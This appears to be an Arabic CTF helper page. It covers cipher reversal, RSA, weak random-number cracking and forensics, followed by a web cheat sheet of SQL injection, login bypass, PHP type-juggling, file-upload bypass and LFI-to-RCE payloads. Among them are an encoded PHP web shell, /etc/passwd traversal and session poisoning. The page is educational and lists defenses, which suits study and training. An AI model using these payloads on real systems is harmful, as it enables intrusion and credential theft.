🐍 مختبر بايثون — اعكس سكربتات التشفير

    
بايثون حقيقي داخل متصفحك. ألصق سكربت التشفير المُعطى لفهمه، ارفع الملف المشفّر، واكتب فكّ التشفير شغّله هنا. يعمل بدون إنترنت بعد أول تحميل. زر «اعكس تلقائياً» يحاول عكس السكربت آلياً لما يقبل العكس (عمليات بايت-ببايت أو إعادة ترتيب بلا مفتاح)، ويتحقّق بإعادة التشفير، ويخبرك بصراحة حين يكون التحدي خارج نطاقه (تشفير بمفتاح أو كتلي أو دالة هاش).

🔁 فك الأسّ النمطي — RSA ومقلوب الأسّ

    
لتحديات من نوع ciphertext ≡ secret^e mod n. يحسب رتبة الزمرة، ثم d = e⁻¹ mod order، ثم secret = c^d mod n، ويتحقّق بإعادة التشفير. تقبل الحقول صيغاً مثل 2^136+85 أو 0x… أو رقماً عادياً.

🧮 الخوارزميات و Haskell — كسر المولّدات وقراءة الشيفرة

    
لتحديات فيها مولّد أرقام عشوائي ضعيف (LCG أو Mersenne Twister) أو سكربت بلغة مثل Haskell. اكسر المولّد من مخرجاته، أو ترجم الشيفرة إلى بايثون لتشغيلها في تبويب «بايثون».

  


  

    
🧩 حل معادلات نمطية دفعة واحدة — a·x mod n = b

    
نمط شائع: مجموعة معادلات، كل واحدة تعطي بايتاً من العلم. يحسب x = b·a⁻¹ mod n لكل سطر ويبني العلم من chr(x%256). يقبل صيغ mod و % و (mod n)، ويرتّب حسب x[i].

    
    

    

  


  

    
🎲 كسر LCG (مولّد خطي متطابق)

    
الصيغة: x₍ₙ₊₁₎ = (a·xₙ + c) mod m. ألصق المخرجات المتتالية (رقم في كل سطر أو مفصولة بفواصل). يستعيد a و c و m ثم يتنبّأ بالتالي.

    

      
      

        
        
        

      

    

    

  


  

    
🌀 توقّع Mersenne Twister (MT19937)

    
نفس مولّد random في بايثون. من 624 مخرجاً متتالياً كاملاً (32-bit) نستنسخ الحالة ونتنبّأ بكل ما يليها. ألصق المخرجات (أرقام 32-bit).

    
    

      

    

  


  

    
λ قراءة Haskell وترجمتها إلى بايثون

    
لا يمكن تشغيل Haskell في المتصفح، لكن معظم تحديات التشفير تترجم بسهولة إلى بايثون — انقلها إلى تبويب «بايثون» وشغّلها أو اعكسها. اضغط أي مقطع لنسخه.

أنماط متكرّرة في CTF

        
    
          
  • أسّ نمطي secret ^ 31337 `mod` n ← هذا RSA بمعامل؛ استخدم تبويب «فك أسّي».
    • 
          
  • شيفرة XOR zipWith xor msg (cycle key) ← تبويب الشيفرات (XOR) أو بايثون.
    • 
          
  • طيّ تراكمي foldl على البايتات ← أعِد كتابته في بايثون واعكسه بـ «اعكس تلقائياً».
    • 
          
  • Integer في Haskell دقّة لا نهائية مثل int في بايثون — لا قلق من الطول.
    • 
          
  • الأرقام الكبيرة تُكتب عادية؛ 0x للست عشري. 2^136+85 تُكتب كما هي.
    •

🗂️ التحليل الجنائي

      
    
        
  • الامتداد قد يكذب: ثق في التوقيع السحري. ملفات docx/xlsx/apk/jar هي في الحقيقة ZIP — افتحها وابحث داخلها.
    • 
        
  • بيانات بعد النهاية لملف PNG (IEND) أو JPEG (FFD9) أو ZIP مكان إخفاء كلاسيكي.
    • 
        
  • PNG بخطأ CRC في IHDR = العرض أو الارتفاع عُدّل — تحليل الملفات يجد الأبعاد الحقيقية.
    • 
        
  • ZIP بكلمة سر: ابحث عن كلمة السر في مكان آخر من التحدي (البيانات الوصفية، النصوص، الصورة).
    • 
        
  • PCAP: في Wireshark ← Statistics ← Protocol Hierarchy؛ زر يمين ← Follow ← TCP Stream؛ File ← Export Objects ← HTTP.
    • 
        
  • PDF: النص تحت المربعات السوداء يمكن نسخه أحياناً؛ افحص الملفات المضمّنة والبيانات الوصفية.
    • 
        
  • تفريغ ذاكرة ← Volatility؛ صورة قرص ← Autopsy أو FTK Imager.
    • 
        
  • إنتروبيا عالية (≈8.0) = بيانات مضغوطة أو مشفّرة؛ منخفضة = نص أو حشو.
    • 
      

    

    

      
🖼️ إخفاء المعلومات (Stego)

      
    
        
  • الصور: البيانات الوصفية أولاً، ثم طبقات البتات (ابحث عن نص أو نمط في الطبقة 0)، ثم استخراج LSB.
    • 
        
  • الفحص السريع يجرّب 56 تركيبة LSB تلقائياً على صور PNG/BMP/GIF/WebP.
    • 
        
  • إخفاء JPEG (steghide/outguess) يحتاج كلمة مرور — جرّب فارغة أو كلمات من التحدي.
    • 
        
  • الصوت: افتح المخطط الطيفي (غالباً يُرسم نص في الترددات). النغمات قد تكون مورس أو DTMF أو SSTV.
    • 
        
  • النصوص: حروف بعرض صفري أو مسافات/Tab في نهاية الأسطر. الصقها في الفحص السريع — الحروف الخفية تظهر كنقاط حمراء.
    • 
        
  • رموز QR والباركود: امسحها بكاميرا الهاتف أو zxing.org؛ حسّن الألوان بطبقات البتات أولاً.
    • 
      

    

    

      
🌐 الويب (فحص فقط)

      
    
        
  • اعرض مصدر الصفحة (Ctrl+U) وابحث عن flag والتعليقات <!-- --> والحقول المخفية.
    • 
        
  • افحص /robots.txt و /sitemap.xml بحثاً عن صفحات غير مدرجة.
    • 
        
  • أدوات المطوّر ← Application: الكوكيز و localStorage — القيم غالباً Base64 أو JWT.
    • 
        
  • أدوات المطوّر ← Network: ترويسات الاستجابة وردود الـ API والملفات المحمّلة.
    • 
        
  • أدوات المطوّر ← Sources: ابحث في كل ملفات JavaScript (Ctrl+Shift+F).
    • 
        
  • الصق أي رمز مريب في الفحص السريع أو في فاك JWT.
    •

💉 حقن SQL — الكشف

      
أدخل رموزاً تكسر بناء الاستعلام وراقب تغيّر السلوك أو ظهور خطأ.

      

        
'اقتباس مفرد — كسر الاستعلام

        
"اقتباس مزدوج

' AND '1'='2شرط دائم الخطأ (قارن النتيجتين)

        
1' AND SLEEP(3)-- -تأخّر = الحقن يعمل (أعمى)

      

      
التعليقات لإنهاء بقية الاستعلام: -- - · # · /* */ (المسافة بعد -- مهمة في MySQL).

    

    

      
🔑 تجاوز تسجيل الدخول

      
في خانة اسم المستخدم (وأحياناً كلمة السر):

' OR '1'='1'-- -صيغة بالاقتباسات

        
') OR ('1'='1'-- -عندما يكون الاستعلام داخل أقواس

        
admin'/* … */-- -تعليق موزّع على الحقلين

      

    

    

      
🧩 UNION — استخراج البيانات

      
    
        
  1. عدد الأعمدة: ' ORDER BY 1-- - وزِد الرقم حتى يظهر خطأ، أو:
    2. 
        
  2. ' UNION SELECT NULL-- - وأضف NULL حتى تنجح.
    3. 
        
  3. اعثر على عمود ظاهر: ' UNION SELECT 1,2,3-- -
    4. 
        
  4. اسحب البيانات في الأعمدة الظاهرة:
    5. 
      

      
' UNION SELECT username,password FROM users-- -

      
بصمة قاعدة البيانات: @@version · version() · database() · user(). دمج عدة صفوف في MySQL: group_concat(username,0x3a,password).

    

    

      
🗂️ استخراج المخطط (MySQL)

🕶️ الحقن الأعمى (Blind)

      
لا تظهر البيانات مباشرة — استنتجها حرفاً حرفاً.

      

        
منطقي' AND SUBSTRING(database(),1,1)='a'-- -

        
زمني MySQL' AND IF(1=1,SLEEP(3),0)-- -

        
خطأ MySQL' AND extractvalue(1,concat(0x7e,database()))-- -

        
زمني Postgres'||pg_sleep(3)-- -

        
زمني MSSQL'; WAITFOR DELAY '0:0:3'-- -

      

      
للأتمتة: sqlmap -u URL --batch --dbs (على تحديات CTF أو أنظمتك فقط).

🐘 خدع PHP (PHP spoofs / bypass)

    
أنماط شائعة في تحديات الويب لأن PHP يتساهل في الأنواع والمقارنات.

  

  

    

      
⚖️ المقارنة الفضفاضة (type juggling)

      

        
"0e123" == "0e456"صحيح! كلاهما يُقرأ كـ 0 (أسّي)

        
0 == "abc"صحيح في PHP < 8

        
"1abc" == 1صحيح في PHP < 8

      

      
Magic hashes: كلمات هاشها بصيغة 0e[أرقام] فتتساوى مع == :

      

        
240610708md5 = 0e462097…

        
QNKCDZOmd5 = 0e830400…

        
10932435112sha1 = 0e077669…

      

      
إن رأيت if (md5($pw) == $hash) فجرّب هذه. الدفاع: استخدم === و hash_equals().

    

    

      
🧷 تجاوز strcmp / in_array

      
تمرير مصفوفة بدل نص يُربك الدوال:

      
password[]=x

      
strcmp(array, "...") يعيد NULL (مع تحذير) و NULL == 0 صحيح → تجاوز if (strcmp($pw,$real)==0). ينطبق على strpos و in_array($x,$a) (بلا true ثالث). الدفاع: تحقّق is_string() و ===.

      
🧮 preg_match (قائمة سوداء)

      
فلتر مثل /union.+select/i يُتجاوز بسطر جديد %0a لأن . لا يطابق السطر الجديد افتراضياً. و /^admin$/ قد يُخدع بـ admin%0a<payload> (بدون لاحقة D، $ يطابق قبل سطر جديد أخير).

    

    

      
📤 تجاوز رفع الملفات (upload spoofing)

      

        
shell.phtmlامتدادات بديلة تُنفَّذ كـ PHP

        
shell.php5 / .phar / .phtبدائل حسب الإعداد

        
shell.php.jpgامتداد مزدوج

        
shell.PhPتلاعب بحالة الأحرف

        
shell.php%20 / shell.php.مسافة/نقطة لاحقة (ويندوز)

      

      
انتحال النوع: أرسل Content-Type: image/png لملف PHP. بايتات سحرية: ابدأ الملف بـ GIF89a; ثم كود PHP ليمرّ فحص الصورة.

      
رفع .htaccess يجعل امتداداً مخصصاً يُنفَّذ: AddType application/x-httpd-php .xyz. الدفاع: قائمة بيضاء للامتدادات، إعادة ترميز الصور، تخزين خارج جذر الويب بأسماء عشوائية.

    

    

      
🧪 الأغلفة و LFI → RCE

      
قراءة مصدر صفحة عبر فلتر base64 (كلاسيكي لاستخراج الكود/الأعلام):

      
php://filter/convert.base64-encode/resource=index.php

      

        
php://inputضع كود PHP في جسم POST عند include

        
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs=تنفيذ عبر data

        
expect://idتنفيذ أوامر (إن فُعّل)

        
../../../../etc/passwdعبور المسار (LFI)

      

      
تسميم السجلّات و /proc/self/environ لتحويل LFI إلى تنفيذ. سلاسل فلاتر PHP لاستخراج الأعلام: ابحث عن "php_filter_chain_generator". الدفاع: allow_url_include=Off، قائمة بيضاء للمسارات، basename().

    

    

      
🍪 جلسات PHP (PHPSESSID)

      
الكوكي PHPSESSID ليس إلا مفتاحاً عشوائياً (26 حرفاً من 0-9a-v) — لا يحوي اسم المستخدم. البيانات تُخزَّن على الخادم في ملف:

      
/var/lib/php/sessions/sess_<PHPSESSID>

      
/tmp/sess_<PHPSESSID>

      
صيغة الملف مفتاح|قيمة_متسلسلة، فاسم المستخدم يظهر نصّاً صريحاً:

      
username|s:5:"admin";role|s:9:"moderator";id|i:1;

      

        
اقرأ الجلسةعبر LFI/قراءة ملف: ?page=/tmp/sess_<id>

        
تسميم الجلسةأدخل كود PHP في قيمة مخزّنة (مثل اسم المستخدم أو User-Agent) ثم ضمّن ملف الجلسة → RCE

        
كوكي مزيّف؟إن احتوى الكوكي نقاطاً (JWT) أو = (Base64) فهو رمز مخصّص — فكّه في تبويب «الويب» أو «الهاش»

      

      
تحقّق من المسار الحقيقي عبر session.save_path في phpinfo(). الدفاع: صلاحيات صارمة على مجلّد الجلسات، ومعرّفات جلسة قوية.
